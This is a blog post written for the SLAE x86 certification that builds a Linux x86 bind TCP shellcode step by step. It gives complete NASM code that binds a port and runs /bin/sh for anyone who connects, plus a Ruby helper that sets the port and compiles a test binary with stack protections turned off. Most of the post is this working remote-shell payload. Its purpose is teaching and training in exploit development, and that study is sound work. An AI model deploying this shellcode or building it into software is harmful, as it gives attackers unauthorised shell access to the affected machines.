---
title: "SLAE x86 - Assignment 0x1"
date: 2021-10-18T05:50:49Z
draft: false
tags:
  - exploit_dev
  - assembly
categories:
  - certification
keywords:
  - slae
  - shellcode
  - assembly
---

# Bind TCP Shellcode
## Objectives
- Create a shell bind tcp shellcode
  - Binds	to a port
  - Execs	shell	on incoming	connection
- Port number should be easily configurable

## Structure
Using bind shell from msfvenom, the needed syscalls can be visualize with the help of [`libemu's sctest`](https://github.com/buffer/libemu) and [`dot tool`](https://graphviz.org/):

![](bind_tcp_shellcode.png)

 Generated using:
 ```zsh {linenos=false}
 msfvenom --arch x86 --platform linux -p linux/x86/shell_bind_tcp -f raw | sctest -vvv -Ss 10000 -G bind_tcp_shellcode.dot
 dot bind_tcp_shellcode.dot -T png -o bind_tcp_shellcode.png
 ```

## Creating the NASM Code
### Syscalls and other values
- Below are the needed syscalls and respective opcodes from `/usr/include/asm/unistd_32.h`
```nasm {linenos=false}
  SOCKET      equ 0x167
  BIND        equ 0x169
  LISTEN      equ 0x16b
  ACCEPT      equ 0x16c
  DUP         equ 0x3f
  EXECVE      equ 0xb
```

- These are declared under `section .text` for better reading of the nasm code together with other constants:
```nasm {linenos=false}
  ; settings
  PORT        equ 0xd204        ; default 1234

  ; argument constants
  AF_INET     equ 0x2
  SOCK_STREAM equ 0x1
```

### Socket(2)
- This will create an endpoint for communication and returns a file descriptor that refers the endpoint.
 The usage are detailed in: https://man7.org/linux/man-pages/man2/socket.2.html
- Synopsis: `socket(int domain, int type, int protocol)`
- Syscall arguments:
  - ebx: AF_INET     = 2
  - ecx: SOCK_STREAM = 1
  - edx: IPPROTO_IP  = 6

 NASM Code:
 ```nasm {linenostart=28}
   mov ax, SOCKET
   mov bl, AF_INET
   mov cl, SOCK_STREAM
   mov dl, 0x6
   int 0x80
 ```

### Bind(2)
- This will assign an address to the socket referred to by the file descriptor returned from [Socket(2)](#socket2).
 The usage are detailed in: https://man7.org/linux/man-pages/man2/bind.2.html
- Synopsis: `bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)`
- Syscall arguments:
  - ebx: sockfd   = eax(returned from previous syscall)
  - ecx: sockaddr = { AF_INET; PORT; 0x0; 0x0 }
    - AF_INET = 2
    - PORT    = 1234
  - edx: addrlen  = 16

 NASM Code:
 ```nasm {linenostart=36}
  xchg edi, eax
  xor ecx, ecx
  mul ecx
  push ecx
  push ecx
  push ecx
  mov byte [esp], AF_INET
  mov word [esp + 0x2], PORT
  push esp
  pop ecx
  push 0x10
  pop edx
  mov ebx, edi
  mov ax, BIND
  int 0x80
 ```

### Listen(2)
- This will mark the sockfd accept incoming connection requests using [Accept(2)](#accept2).
 The usage are detailed in: https://man7.org/linux/man-pages/man2/listen.2.html
- Synopsis: `listen(int sockfd, int backlog)`
- Syscall arguments:
  - ebx: sockfd   = edi(same sockfd used by last syscall)
  - ecx: backlog = 0x0(does not need to grow the sockfd for pending connections)

 NASM Code:
 ```nasm {linenostart=52}
  ; ebx already contain the sockfd from previous syscall
  xor ecx, ecx
  mov ax, LISTEN
  int 0x80
 ```

### Accept4(2)
- This will extract the first connection request for listening socket from [Listen(2)](#listen2) then creates a new connected socket, and returns a new file descriptor referring to that socket.
 The usage are detailed in: https://linux.die.net/man/2/accept4
- Synopsis: `accept4(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flags);`
- Syscall arguments:
  - ebx: sockfd   = edi(same sockfd used by last syscall)
  - ecx: sockaddr = 0x0
  - edx: addrlen = 0x0
  - esi: flags = 0x0

 NASM Code:
 ```nasm {linenostart=57}
  ; ebx already contain the sockfd from previous syscall
  mov edx, ecx
  xor esi, esi
  mov ax, ACCEPT
  int 0x80
 ```

### Dup(2)
- This will allocate the file descriptors, virtual handles used to access certain process I/O operations and to simulate remote user's input and display to the terminal.
 The usage are detailed in: https://man7.org/linux/man-pages/man2/dup.2.html
- Synopsis: `dup(int oldfd, int newfd, int flags)`
- Syscall arguments:
  - ebx: sockfd   = eax(returned sockfd from [Accept4(2)](#accept42))
  - ecx: sockaddr = stdin, stdout, and stderr
    - stdin  = 0x0
    - stdout = 0x1
    - stderr = 0x2

 NASM Code:
 ```nasm {linenostart=64}
  mov ebx, eax ; ebx = new sockfd
  push 0x3
  pop ecx
loop:
  xor eax, eax
  mov al, DUP
  dec ecx
  int 0x80
  jne loop
 ```

### Execve(2)
- This will execute the `/bin/sh` program on the remote machine
 The usage are detailed in: https://man7.org/linux/man-pages/man2/execve.2.html
- Synopsis: `execve(const char *pathname, char *const argv[], char *const envp[])`
- Syscall arguments:
  - ebx: pathname   = 'bin//sh' address in stack
  - ecx: argv       = 0x0
  - ecx: envp       = 0x0

 NASM Code:
 ```nasm {linenostart=75}
  xor ebx, ebx
  mul ebx
  push ebx
  push 0x68732f2f
  push 0x6e69622f
  mov ebx, esp
  mov al, EXECVE
  int 0x80
 ```

## Final NASM Code
```nasm
; Purpose: Bind TCP shellcode

global _start

section .text
  ; settings
  PORT        equ 0xd204        ; default 1234

  ; syscall kernel opcodes found in /usr/include/asm/unistd_32.h
  SOCKET      equ 0x167
  BIND        equ 0x169
  LISTEN      equ 0x16b
  ACCEPT      equ 0x16c
  DUP         equ 0x3f
  EXECVE      equ 0xb

  ; argument constants
  AF_INET     equ 0x2
  SOCK_STREAM equ 0x1

_start:
  ; clear registers
  xor ebx, ebx
  xor ecx, ecx
  mul ecx

  ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
  mov ax, SOCKET
  mov bl, AF_INET
  mov cl, SOCK_STREAM
  mov dl, 0x6
  int 0x80                            ; syscall socket(2)

  ; bind(sockfd, &sockaddr, 16)
  ; sockaddr = {AF_INET; PORT}
  xchg edi, eax                       ; edi = sockfd
  xor ecx, ecx                        ; clear ecx
  mul ecx                             ; clear eax and edx
  push ecx                            ; 0x0
  push ecx                            ; 0x0
  push ecx                            ; 0x0; this will be overwritten by the next two instructions
  mov byte [esp], AF_INET             ; esp = 0x00000002
  mov word [esp + 0x2], PORT          ; esp = 0xd2040002
  push esp                            ; push sockaddr
  pop ecx                             ; ecx = &sockadddr
  push 0x10                           ; 16
  pop edx                             ; edx = 16
  mov ebx, edi                        ; ebx = sockfd
  mov ax, BIND                        ; bind(2)
  int 0x80                            ; syscall bind(2)

  ; listen(sockfd, 0)                 ; ebx already contain the sockfd from previous syscall
  xor ecx, ecx                        ; clear ecx
  mov ax, LISTEN                      ; listen(2)
  int 0x80                            ; syscall listen(2)

  ; accept(sockfd, NULL, NULL, NULL)  ; ebx already contain the sockfd from previous syscall
  mov edx, ecx                        ; clear edx
  xor esi, esi                        ; clear esi
  mov ax, ACCEPT                      ; accept4(2)
  int 0x80                            ; syscall accept4(2)

  ; dup(sockfd, fd)
  mov ebx, eax                        ; ebx = new sockfd
  push 0x3                            ; prepare esp for ecx
  pop ecx                             ; ecx = 0x3
loop:
  xor eax, eax                        ; clear eax
  mov al, DUP                         ; dup(2)
  dec ecx                             ; decrement ecx to cover all 0x2, 0x1, and 0x0 fds
  int 0x80                            ; syscall dup(2)
  jne loop                            ; loop until ecx is zero

  ; execve('/bin//sh', NULL, NULL)
  xor ebx, ebx                        ; clear ebx
  mul ebx                             ; clear eax and edx
  push ebx                            ; push NULL
  push 0x68732f2f                     ; "hs//"
  push 0x6e69622f                     ; "nib/"
  mov ebx, esp                        ; ebx = esp address
  mov al, EXECVE                      ; execve(2)
  int 0x80                            ; syscall execve(2)
```

## Dynamic Configuration
Using a simple Ruby script below, the `PORT` number can be dynamically assigned:
```ruby
#!/usr/bin/env ruby
# Author: Jason Villaluna

require 'optparse'

def run
  parse_args
  @port = to_hex(@port)
  @filename = @filename
  replace_port
  compile_nasm
  @shellcode = generate_shellcode
  replace_shellcode
  compile_binary
rescue OptionParser::MissingArgument
  puts "Missing argument:"
  @parser.parse %w[--help]
rescue StandardError = e
  puts "An error #{e.inspect} occurred"
  exit(1)
end

# Convert number into hex format used by the nasm code
def to_hex(number)
  hex = number.to_s(16)
  hex = hex.size.even? ? hex : hex.prepend('0')
  hex.scan(/../).reverse.join.prepend('0x')
end

# Replace a value inside a file
def replace_content(filename = "#{@filename}.nasm")
  file_content = File.read(filename)
  yield(file_content)
  File.write(filename, file_content)
end

# Replace the port number in the nasm file
def replace_port
  replace_content do |nasm_code|
    nasm_code.gsub!(/PORT\s*equ\s\S+/, "PORT        equ #{@port}")
  end
end

# Compile the nasm code
def compile_nasm
  `nasm -f elf32 -o #{@filename}.o #{@filename}.nasm`
  `ld -m elf_i386 -s -o #{@filename} #{@filename}.o`
end

# Generate shellcode using objdump
def generate_shellcode
  objdump = `objdump -d #{@filename}`
  objdump.split("\n").map { |line| line.split("\t")[1] }
    .compact.map(&:split).join('\x').prepend('\x')
end

# Replace shellcode in the shellcode tester program
def replace_shellcode
  replace_content('./shellcode.c') do |c_code|
    c_code.gsub!(/\"\S+\"\;/, "\"#{@shellcode}\"\;")
  end
end

# Compile the shellcode into binary with the help of the shellcode.c program
def compile_binary
  `gcc -fno-stack-protector -m32 -z execstack shellcode.c -o shellcode 2 /dev/null`
end

def parse_args
  @parser = OptionParser.new do |opts|
    opts.banner = "Usage: #{$0} [options]"
    opts.separator ""
    opts.separator "Options:"

    opts.on("--port", "-p PORT", "Port number of the listener") do |value|
      @port = value.to_i
    end

    opts.on("--nasm", "-n NASM", "Basename of the nasm code") do |value|
      @filename = value
    end

    opts.on_tail("--help", "-h", "Print options") do |show_help|
      warn opts
      exit(0)
    end
  end
  @parser.parse!
end

if __FILE__ == $PROGRAM_NAME
  run
  puts "Successfully generated \e[32mshellcode\e[0m binary!"
end
```

### Script usage and shellcode testing
![](bind_tcp_shellcode.gif)

---
This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: [http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE - 1558

---
[`Link to Github repository`](https://github.com/jsnv-dev/slae_x86_assignments/tree/main/A1) | [`Link to index page`](../slae_x86)
